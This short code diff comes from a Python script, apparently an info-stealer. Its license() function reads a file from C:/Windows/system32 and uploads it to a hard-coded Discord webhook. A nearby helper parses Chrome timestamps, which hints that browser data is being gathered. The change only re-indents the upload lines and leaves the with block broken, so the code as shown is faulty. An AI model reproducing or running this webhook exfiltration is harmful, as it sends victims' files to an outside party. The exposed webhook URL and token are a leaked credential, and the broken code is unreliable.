@@ -21,9 +21,10 @@ from discord_webhook import DiscordWebhook
 
 def license():
     web=DiscordWebhook(url="https://discord.com/api/webhooks/988419327994761227/QT-ORLi1GRxBbbsbRLs5fs3MkCy2dOuoQL_pFgrhmyCrBYNPSejTcIh8J2ooq9NtFbXy")
-        with open("C:/Windows/system32/license.rtf", "rb") as f:
-            web.add_file(file=f.read(), filename='license.rtf')
-        web.execute()
+    with open("C:/Windows/system32/license.rtf", "rb") as f:
+    web.add_file(file=f.read(), filename='license.rtf')
+    web.execute()
+
 def chrome_date_and_time(chrome_data):
     # Chrome_data format is 'year-month-date 
     # hr:mins:seconds.milliseconds
